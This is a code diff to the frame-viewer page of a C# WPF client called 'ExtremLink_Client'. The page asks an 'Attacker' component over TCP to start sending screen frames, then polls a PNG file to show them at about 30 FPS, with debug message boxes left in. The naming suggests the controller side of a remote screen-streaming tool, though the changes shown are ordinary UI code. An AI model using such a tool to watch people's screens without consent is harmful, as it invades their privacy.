@@ -43,6 +43,8 @@ namespace ExtremLink_Client.Pages
         private void PlayBtn_Click(object sender, RoutedEventArgs e)
         {
             Attacker.AttackerInstance.SendTCPMessageToClient("&", "StartSendFrames");
+            this.isReceivingFrames = true;
+            this.UpdateFrame();
         }
         private void PauseBtn_Click(object sender, RoutedEventArgs e)
         {
@@ -63,21 +65,29 @@ namespace ExtremLink_Client.Pages
         private BitmapImage LoadFrameFromFile()
         {
             string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
-            string tempFramePath = System.IO.Path.Combine(baseDirectory, "tempFrame.png");
-            return Attacker.AttackerInstance.GetImageOfPNGFile(tempFramePath);
+
+
+            MessageBox.Show("1");
+            // Note: Debug this line:
+            string tempFramePath = System.IO.Path.Combine(baseDirectory, Attacker.AttackerInstance.TempPngFileName);
+            MessageBox.Show("2");
+            
+            
+            return Attacker.AttackerInstance.GetBitmapImageFromPNGFile(tempFramePath);
         }
+
         private async void UpdateFrame()
         {
-            while (isReceivingFrames)
+            while (this.isReceivingFrames)
             {
                 try
                 {
                     if (this.LoadFrameFromFile() != null)
                     {
-                        await frameImg.Dispatcher.InvokeAsync(() => frameImg.Source = LoadFrameFromFile());
+                        await Dispatcher.InvokeAsync(() => frameImg.Source = this.LoadFrameFromFile());
                     }
-                    // Set the sleep function so the frame rate will be around ~60 FPS
-                    await Task.Delay(16);
+                    // Set the sleep function so the frame rate will be around ~30 FPS
+                    await Task.Delay(32);
                 }
                 catch (Exception ex)
                 {
